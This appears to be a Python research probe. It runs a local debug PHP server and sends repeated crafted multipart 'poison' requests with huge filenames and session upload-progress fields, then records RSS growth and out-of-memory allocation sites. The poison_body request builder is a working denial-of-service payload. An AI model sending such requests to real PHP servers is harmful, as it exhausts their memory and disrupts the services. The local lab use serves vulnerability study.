#!/usr/bin/env python3
"""Migration probe: does the OOM site migrate from the multipart parser
(zend_string.h / rfc1867.c) into the serializer (zend_smart_str.c) as a
single worker accumulates leak damage over consecutive poison requests?

One debug-build php -S worker, memory_limit=16M, N consecutive poisons
(unique SIDs). For each request: HTTP status, latency, worker RSS before/after,
and the error.log alloc-site lines written by that request.
Output: CSV to stdout. error.log kept at argv[3].
"""
import http.client, os, signal, subprocess, sys, time

PORT = 8099
PHP = sys.argv[1]
WORK = sys.argv[2]
N = int(sys.argv[3]) if len(sys.argv) > 3 else 12

def part(name, value, fname=None):
    b = "--BOUNDARYX\r\nContent-Disposition: form-data; name=\"%s\"" % name
    if fname:
        b += "; filename=\"%s\"" % fname
    b += "\r\n\r\n"
    return b.encode() + value + b"\r\n"

def poison_body(sid, key, nfiles=20):
    b = part("PHPSESSID", sid.encode()) + part("PHP_SESSION_UPLOAD_PROGRESS", key.encode())
    for i in range(nfiles):
        b += part("f%d" % i, b"X", "A" * 262144)
    return b + b"--BOUNDARYX--\r\n"

def rss(pid):
    try:
        with open("/proc/%d/status" % pid) as f:
            for l in f:
                if l.startswith("VmRSS"):
                    return int(l.split()[1])
    except Exception:
        pass
    return -1

def main():
    os.makedirs(WORK + "/docroot/sess", exist_ok=True)
    with open(WORK + "/docroot/index.php", "w") as f:
        f.write('<?php echo "OK\\n";')
    with open(WORK + "/lab.ini", "w") as f:
        f.write("""memory_limit=16M
session.upload_progress=On
session.use_strict_mode=0
session.save_path=%s/docroot/sess
error_log=%s/error.log
display_errors=0
log_errors=1
max_execution_time=30
upload_max_filesize=64M
post_max_size=64M
max_file_uploads=50
""" % (WORK, WORK))
    srv = subprocess.Popen([PHP, "-S", "127.0.0.1:%d" % PORT, "-t", WORK + "/docroot",
                            "-c", WORK + "/lab.ini"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           preexec_fn=os.setsid)
    time.sleep(1.2)
    print("req,http,latency_s,rss_before_kb,rss_after_kb,site,tried_bytes")
    try:
        for k in range(N):
            elog = WORK + "/error.log"
            prev = os.path.getsize(elog) if os.path.exists(elog) else 0
            r0 = rss(srv.pid)
            body = poison_body("mg%05d" % k, "mk%d" % k)
            t0 = time.perf_counter()
            try:
                c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=45)
                c.request("POST", "/", body, {
                    "Content-Type": "multipart/form-data; boundary=BOUNDARYX",
                    "Content-Length": str(len(body))})
                r = c.getresponse(); r.read(); st = r.status; c.close()
                dt = time.perf_counter() - t0
            except Exception:
                st, dt = -1, time.perf_counter() - t0
            r1 = rss(srv.pid)
            time.sleep(0.15)
            site, tried = "-", "-"
            if os.path.exists(elog):
                with open(elog, "rb") as f:
                    f.seek(prev)
                    chunk = f.read().decode("utf-8", "replace")
                # per-request emitted lines; take all sites seen
                sites = set()
                trieds = set()
                for line in chunk.splitlines():
                    if "exhausted at " in line:
                        s = line.split("exhausted at ", 1)[1].split(" ", 1)[0]
                        sites.add(s.rsplit("/", 1)[-1] if "/" in s else s)
                    if "tried to allocate " in line:
                        t = line.split("tried to allocate ", 1)[1].split(" ", 1)[0]
                        trieds.add(t)
                if sites:
                    site = "|".join(sorted(sites))
                    tried = "|".join(sorted(trieds))
            print("%d,%s,%.3f,%d,%d,%s,%s" % (k, st, dt, r0, r1, site, tried), flush=True)
    finally:
        os.killpg(srv.pid, signal.SIGKILL)
        srv.wait()

if __name__ == "__main__":
    main()
